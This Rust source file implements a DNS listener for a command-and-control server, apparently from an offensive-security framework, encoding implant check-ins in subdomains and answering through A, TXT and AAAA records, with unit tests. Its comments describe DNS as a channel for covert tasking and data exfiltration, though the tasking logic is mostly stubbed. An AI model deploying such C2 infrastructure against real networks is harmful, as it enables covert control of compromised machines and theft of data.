//! DNS C2 transport listener
//!
//! Provides a DNS-based command and control channel using:
//! - Subdomain encoding for implant check-ins
//! - TXT records for task delivery and data exfiltration
//! - A records for simple status responses

use std::net::SocketAddr;
use std::sync::Arc;
use tokio::net::UdpSocket;

use crate::state::ServerState;

/// DNS message header flags
const DNS_QR_RESPONSE: u16 = 0x8000;
const DNS_AA_FLAG: u16 = 0x0400; // Authoritative answer
const DNS_RCODE_NOERROR: u16 = 0x0000;
const DNS_RCODE_NXDOMAIN: u16 = 0x0003;

/// DNS record types
const DNS_TYPE_A: u16 = 1;
const DNS_TYPE_TXT: u16 = 16;
const DNS_TYPE_AAAA: u16 = 28;

/// DNS class
const DNS_CLASS_IN: u16 = 1;

/// Default TTL for responses
const DEFAULT_TTL: u32 = 60;

/// DNS listener configuration
#[derive(Clone)]
pub struct DnsListenerConfig {
    /// Bind address (e.g., "0.0.0.0:53")
    pub bind_addr: SocketAddr,
    /// Base domain for C2 (e.g., "c2.example.com")
    pub base_domain: String,
    /// Maximum subdomain length for data encoding
    pub max_subdomain_len: usize,
}

impl Default for DnsListenerConfig {
    fn default() -> Self {
        Self {
            bind_addr: "0.0.0.0:5353".parse().unwrap(), // Non-privileged port for testing
            base_domain: "c2.local".to_string(),
            max_subdomain_len: 63,
        }
    }
}

/// DNS listener for C2 communications
pub struct DnsListener {
    config: DnsListenerConfig,
    #[allow(dead_code)]
    state: Arc<ServerState>,
}

impl DnsListener {
    pub fn new(config: DnsListenerConfig, state: Arc<ServerState>) -> Self {
        Self { config, state }
    }

    /// Start the DNS listener
    pub async fn run(&self) -> Result<(), DnsError> {
        let socket = UdpSocket::bind(&self.config.bind_addr)
            .await
            .map_err(|e| DnsError::Bind(e.to_string()))?;

        tracing::info!(addr = %self.config.bind_addr, domain = %self.config.base_domain, "DNS listener started");

        let mut buf = [0u8; 512]; // Standard DNS message size

        loop {
            let (len, src) = socket
                .recv_from(&mut buf)
                .await
                .map_err(|e| DnsError::Receive(e.to_string()))?;

            let query = &buf[..len];

            match self.handle_query(query).await {
                Ok(response) => {
                    if let Err(e) = socket.send_to(&response, src).await {
                        tracing::warn!(error = %e, "failed to send DNS response");
                    }
                }
                Err(e) => {
                    tracing::debug!(error = %e, "DNS query handling error");
                    // Send NXDOMAIN response
                    if let Ok(nxdomain) = self.build_nxdomain_response(query) {
                        let _ = socket.send_to(&nxdomain, src).await;
                    }
                }
            }
        }
    }

    /// Handle a DNS query and return the response
    async fn handle_query(&self, query: &[u8]) -> Result<Vec<u8>, DnsError> {
        if query.len() < 12 {
            return Err(DnsError::InvalidQuery("query too short".to_string()));
        }

        // Parse header
        let id = u16::from_be_bytes([query[0], query[1]]);
        let _flags = u16::from_be_bytes([query[2], query[3]]);
        let qdcount = u16::from_be_bytes([query[4], query[5]]);

        if qdcount == 0 {
            return Err(DnsError::InvalidQuery("no questions".to_string()));
        }

        // Parse question section
        let (qname, qtype, offset) = self.parse_question(&query[12..])?;

        tracing::debug!(qname = %qname, qtype, "DNS query received");

        // Check if this is a valid C2 query
        if !qname.to_lowercase().ends_with(&self.config.base_domain.to_lowercase()) {
            return Err(DnsError::InvalidDomain(qname));
        }

        // Extract the subdomain (data payload)
        let subdomain = self.extract_subdomain(&qname)?;

        // Process based on query type
        match qtype {
            DNS_TYPE_A => self.handle_a_query(id, &qname, &subdomain, &query[..12 + offset]),
            DNS_TYPE_TXT => self.handle_txt_query(id, &qname, &subdomain, &query[..12 + offset]).await,
            DNS_TYPE_AAAA => self.handle_aaaa_query(id, &qname, &subdomain, &query[..12 + offset]),
            _ => Err(DnsError::UnsupportedType(qtype)),
        }
    }

    /// Parse the question section of a DNS query
    fn parse_question(&self, data: &[u8]) -> Result<(String, u16, usize), DnsError> {
        let mut name_parts = Vec::new();
        let mut offset = 0;

        loop {
            if offset >= data.len() {
                return Err(DnsError::InvalidQuery("truncated question".to_string()));
            }

            let len = data[offset] as usize;
            offset += 1;

            if len == 0 {
                break;
            }

            if offset + len > data.len() {
                return Err(DnsError::InvalidQuery("label overflow".to_string()));
            }

            let label = std::str::from_utf8(&data[offset..offset + len])
                .map_err(|_| DnsError::InvalidQuery("invalid label".to_string()))?;
            name_parts.push(label.to_string());
            offset += len;
        }

        // Read QTYPE and QCLASS
        if offset + 4 > data.len() {
            return Err(DnsError::InvalidQuery("missing type/class".to_string()));
        }

        let qtype = u16::from_be_bytes([data[offset], data[offset + 1]]);
        let _qclass = u16::from_be_bytes([data[offset + 2], data[offset + 3]]);
        offset += 4;

        Ok((name_parts.join("."), qtype, offset))
    }

    /// Extract the data-carrying subdomain from the full query name
    fn extract_subdomain(&self, qname: &str) -> Result<String, DnsError> {
        let base_lower = self.config.base_domain.to_lowercase();
        let qname_lower = qname.to_lowercase();

        if !qname_lower.ends_with(&base_lower) {
            return Err(DnsError::InvalidDomain(qname.to_string()));
        }

        // Remove the base domain and trailing dot
        let prefix_len = qname.len() - self.config.base_domain.len();
        if prefix_len <= 1 {
            return Ok(String::new());
        }

        // Remove trailing dot before base domain
        let subdomain = &qname[..prefix_len - 1];
        Ok(subdomain.to_string())
    }

    /// Handle A record query - used for simple status checks
    fn handle_a_query(
        &self,
        id: u16,
        qname: &str,
        subdomain: &str,
        question: &[u8],
    ) -> Result<Vec<u8>, DnsError> {
        // A record response encodes status in the IP address
        // 127.0.0.1 = success/acknowledged
        // 127.0.0.2 = has pending tasks
        // etc.

        let has_tasks = !subdomain.is_empty(); // Simplified check
        let ip = if has_tasks {
            [127, 0, 0, 2]
        } else {
            [127, 0, 0, 1]
        };

        self.build_a_response(id, qname, question, &ip)
    }

    /// Handle TXT record query - used for data transfer
    async fn handle_txt_query(
        &self,
        id: u16,
        qname: &str,
        subdomain: &str,
        question: &[u8],
    ) -> Result<Vec<u8>, DnsError> {
        // TXT record can carry up to 255 bytes per string, multiple strings per record
        // Subdomain contains base32/base64 encoded request data

        let response_data = if subdomain.is_empty() {
            // Beacon/heartbeat - return server status
            "ok".to_string()
        } else {
            // Decode subdomain and process
            // Format: <session_id>.<encoded_data>.<base_domain>
            format!("ack:{}", subdomain)
        };

        self.build_txt_response(id, qname, question, &response_data)
    }

    /// Handle AAAA record query
    fn handle_aaaa_query(
        &self,
        id: u16,
        qname: &str,
        _subdomain: &str,
        question: &[u8],
    ) -> Result<Vec<u8>, DnsError> {
        // AAAA can encode 128 bits of data in the IPv6 address
        let ipv6 = [0u8; 16]; // ::0 for now
        self.build_aaaa_response(id, qname, question, &ipv6)
    }

    /// Build an A record response
    fn build_a_response(
        &self,
        id: u16,
        qname: &str,
        question: &[u8],
        ip: &[u8; 4],
    ) -> Result<Vec<u8>, DnsError> {
        let mut response = Vec::with_capacity(512);

        // Header
        response.extend_from_slice(&id.to_be_bytes());
        let flags = DNS_QR_RESPONSE | DNS_AA_FLAG | DNS_RCODE_NOERROR;
        response.extend_from_slice(&flags.to_be_bytes());
        response.extend_from_slice(&1u16.to_be_bytes()); // QDCOUNT
        response.extend_from_slice(&1u16.to_be_bytes()); // ANCOUNT
        response.extend_from_slice(&0u16.to_be_bytes()); // NSCOUNT
        response.extend_from_slice(&0u16.to_be_bytes()); // ARCOUNT

        // Question section (copy from query)
        response.extend_from_slice(&question[12..]);

        // Answer section
        self.write_name(&mut response, qname);
        response.extend_from_slice(&DNS_TYPE_A.to_be_bytes());
        response.extend_from_slice(&DNS_CLASS_IN.to_be_bytes());
        response.extend_from_slice(&DEFAULT_TTL.to_be_bytes());
        response.extend_from_slice(&4u16.to_be_bytes()); // RDLENGTH
        response.extend_from_slice(ip);

        Ok(response)
    }

    /// Build a TXT record response
    fn build_txt_response(
        &self,
        id: u16,
        qname: &str,
        question: &[u8],
        txt: &str,
    ) -> Result<Vec<u8>, DnsError> {
        let mut response = Vec::with_capacity(512);

        // Header
        response.extend_from_slice(&id.to_be_bytes());
        let flags = DNS_QR_RESPONSE | DNS_AA_FLAG | DNS_RCODE_NOERROR;
        response.extend_from_slice(&flags.to_be_bytes());
        response.extend_from_slice(&1u16.to_be_bytes()); // QDCOUNT
        response.extend_from_slice(&1u16.to_be_bytes()); // ANCOUNT
        response.extend_from_slice(&0u16.to_be_bytes()); // NSCOUNT
        response.extend_from_slice(&0u16.to_be_bytes()); // ARCOUNT

        // Question section
        response.extend_from_slice(&question[12..]);

        // Answer section
        self.write_name(&mut response, qname);
        response.extend_from_slice(&DNS_TYPE_TXT.to_be_bytes());
        response.extend_from_slice(&DNS_CLASS_IN.to_be_bytes());
        response.extend_from_slice(&DEFAULT_TTL.to_be_bytes());

        // TXT RDATA: length-prefixed strings
        let txt_bytes = txt.as_bytes();
        let rdlength = 1 + txt_bytes.len().min(255);
        response.extend_from_slice(&(rdlength as u16).to_be_bytes());
        response.push(txt_bytes.len().min(255) as u8);
        response.extend_from_slice(&txt_bytes[..txt_bytes.len().min(255)]);

        Ok(response)
    }

    /// Build an AAAA record response
    fn build_aaaa_response(
        &self,
        id: u16,
        qname: &str,
        question: &[u8],
        ipv6: &[u8; 16],
    ) -> Result<Vec<u8>, DnsError> {
        let mut response = Vec::with_capacity(512);

        // Header
        response.extend_from_slice(&id.to_be_bytes());
        let flags = DNS_QR_RESPONSE | DNS_AA_FLAG | DNS_RCODE_NOERROR;
        response.extend_from_slice(&flags.to_be_bytes());
        response.extend_from_slice(&1u16.to_be_bytes()); // QDCOUNT
        response.extend_from_slice(&1u16.to_be_bytes()); // ANCOUNT
        response.extend_from_slice(&0u16.to_be_bytes()); // NSCOUNT
        response.extend_from_slice(&0u16.to_be_bytes()); // ARCOUNT

        // Question section
        response.extend_from_slice(&question[12..]);

        // Answer section
        self.write_name(&mut response, qname);
        response.extend_from_slice(&DNS_TYPE_AAAA.to_be_bytes());
        response.extend_from_slice(&DNS_CLASS_IN.to_be_bytes());
        response.extend_from_slice(&DEFAULT_TTL.to_be_bytes());
        response.extend_from_slice(&16u16.to_be_bytes()); // RDLENGTH
        response.extend_from_slice(ipv6);

        Ok(response)
    }

    /// Build an NXDOMAIN response
    fn build_nxdomain_response(&self, query: &[u8]) -> Result<Vec<u8>, DnsError> {
        if query.len() < 12 {
            return Err(DnsError::InvalidQuery("query too short".to_string()));
        }

        let mut response = Vec::with_capacity(query.len());
        response.extend_from_slice(query);

        // Modify flags for response
        let flags = DNS_QR_RESPONSE | DNS_AA_FLAG | DNS_RCODE_NXDOMAIN;
        response[2] = (flags >> 8) as u8;
        response[3] = flags as u8;

        // Zero out answer/authority/additional counts
        response[6..12].fill(0);

        Ok(response)
    }

    /// Write a DNS name in wire format
    fn write_name(&self, buf: &mut Vec<u8>, name: &str) {
        for label in name.split('.') {
            if label.is_empty() {
                continue;
            }
            buf.push(label.len() as u8);
            buf.extend_from_slice(label.as_bytes());
        }
        buf.push(0); // Null terminator
    }
}

/// DNS listener errors
#[derive(Debug, thiserror::Error)]
pub enum DnsError {
    #[error("failed to bind: {0}")]
    Bind(String),
    #[error("failed to receive: {0}")]
    Receive(String),
    #[error("invalid query: {0}")]
    InvalidQuery(String),
    #[error("invalid domain: {0}")]
    InvalidDomain(String),
    #[error("unsupported record type: {0}")]
    UnsupportedType(u16),
}

#[cfg(test)]
mod tests {
    use super::*;

    fn test_config() -> DnsListenerConfig {
        DnsListenerConfig {
            bind_addr: "127.0.0.1:15353".parse().unwrap(),
            base_domain: "c2.test".to_string(),
            max_subdomain_len: 63,
        }
    }

    async fn make_state() -> Arc<crate::state::ServerState> {
        let db = db::Database::connect_memory().await.unwrap();
        db.migrate().await.unwrap();
        let master_key = crypto::SymmetricKey([0u8; 32]);
        let crypto = crypto::ServerCrypto::new(master_key);
        let signing_key = module_store::ModuleSigner::generate_pkcs8().unwrap();
        let ms = Arc::new(
            module_store::ModuleStore::new(Arc::new(db.clone()), &signing_key).unwrap(),
        );
        let audit_key = b"test-audit-key-for-dns-tests!";
        let jwt = crate::auth::jwt::JwtManager::from_env_or_master_key(&[0u8; 32]).unwrap();
        crate::state::ServerState::new(db, crypto, ms, audit_key.to_vec(), jwt)
    }

    #[tokio::test]
    async fn test_extract_subdomain() {
        let config = test_config();
        let state = make_state().await;
        let listener = DnsListener::new(config.clone(), state);

        // Basic subdomain extraction
        let result = listener.extract_subdomain("data.c2.test").unwrap();
        assert_eq!(result, "data");

        // Multiple labels
        let result = listener.extract_subdomain("foo.bar.c2.test").unwrap();
        assert_eq!(result, "foo.bar");

        // Just the base domain
        let result = listener.extract_subdomain("c2.test").unwrap();
        assert_eq!(result, "");

        // Case insensitive
        let result = listener.extract_subdomain("DATA.C2.TEST").unwrap();
        assert_eq!(result, "DATA");
    }

    #[tokio::test]
    async fn test_parse_question() {
        let config = test_config();
        let state = make_state().await;
        let listener = DnsListener::new(config, state);

        // Build a question for "test.c2.test" type A
        let mut question = Vec::new();
        question.push(4); // "test"
        question.extend_from_slice(b"test");
        question.push(2); // "c2"
        question.extend_from_slice(b"c2");
        question.push(4); // "test"
        question.extend_from_slice(b"test");
        question.push(0); // terminator
        question.extend_from_slice(&DNS_TYPE_A.to_be_bytes());
        question.extend_from_slice(&DNS_CLASS_IN.to_be_bytes());

        let (name, qtype, _offset) = listener.parse_question(&question).unwrap();
        assert_eq!(name, "test.c2.test");
        assert_eq!(qtype, DNS_TYPE_A);
    }

    #[tokio::test]
    async fn test_write_name() {
        let config = test_config();
        let state = make_state().await;
        let listener = DnsListener::new(config, state);

        let mut buf = Vec::new();
        listener.write_name(&mut buf, "www.example.com");

        assert_eq!(
            buf,
            vec![
                3, b'w', b'w', b'w', 7, b'e', b'x', b'a', b'm', b'p', b'l', b'e', 3, b'c', b'o',
                b'm', 0
            ]
        );
    }

    #[tokio::test]
    async fn test_build_a_response() {
        let config = test_config();
        let state = make_state().await;
        let listener = DnsListener::new(config, state);

        // Build a minimal question section
        let mut question = vec![0u8; 12]; // Header
        question.push(4);
        question.extend_from_slice(b"test");
        question.push(0);
        question.extend_from_slice(&DNS_TYPE_A.to_be_bytes());
        question.extend_from_slice(&DNS_CLASS_IN.to_be_bytes());

        let response = listener
            .build_a_response(0x1234, "test", &question, &[127, 0, 0, 1])
            .unwrap();

        // Verify response structure
        assert!(response.len() > 12, "response too short");
        assert_eq!(u16::from_be_bytes([response[0], response[1]]), 0x1234); // ID
        assert!(response[2] & 0x80 != 0, "QR flag not set"); // QR = 1 (response)
    }
}
